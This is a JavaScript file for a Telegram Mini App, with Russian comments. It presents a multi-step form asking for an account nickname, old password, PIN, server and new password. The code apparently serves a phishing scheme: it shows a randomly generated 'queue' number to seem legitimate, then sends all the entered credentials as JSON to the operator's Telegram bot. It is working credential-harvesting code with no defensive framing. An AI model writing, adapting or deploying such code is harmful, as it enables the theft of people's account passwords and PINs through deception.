// Инициализация Telegram WebApp
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

let savedData = {};

// Функция для перехода между экранами (из твоего HTML)
function goToScreen(num) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const nextScreen = document.getElementById('screen' + num);
    if (nextScreen) {
        nextScreen.classList.add('active');
    }
}

// Функция сбора данных (Экран 2 -> Экран 3)
function prepareData() {
    const nick = document.getElementById('nick').value;
    const old_pass = document.getElementById('old_pass').value;
    const pin = document.getElementById('pin').value;
    const server = document.getElementById('server').value;
    const new_pass = document.getElementById('new_pass').value;
    const errorMsg = document.getElementById('error-msg');

    // Проверка обязательных полей
    if (!nick || !old_pass || !server || !new_pass) {
        if (errorMsg) errorMsg.style.display = 'block';
        return;
    }
    if (errorMsg) errorMsg.style.display = 'none';

    // Сохраняем данные во временный объект
    savedData = {
        nick: nick,
        old_password: old_pass,
        pin_code: pin || "Не указан",
        server: server,
        new_password: new_pass
    };

    // Генерируем случайную очередь
    const randomQueue = Math.floor(Math.random() * 99) + 1;
    const queueElement = document.getElementById('queue-val');
    if (queueElement) {
        queueElement.innerText = randomQueue;
    }
    
    goToScreen(3);
}

// Финальная отправка данных боту
function finalSend() {
    try {
        // Превращаем объект в строку и отправляем боту
        tg.sendData(JSON.stringify(savedData));
    } catch (e) {
        console.error("Ошибка при отправке данных в Telegram:", e);
    }
    
    // Закрываем мини-приложение
    tg.close();
}
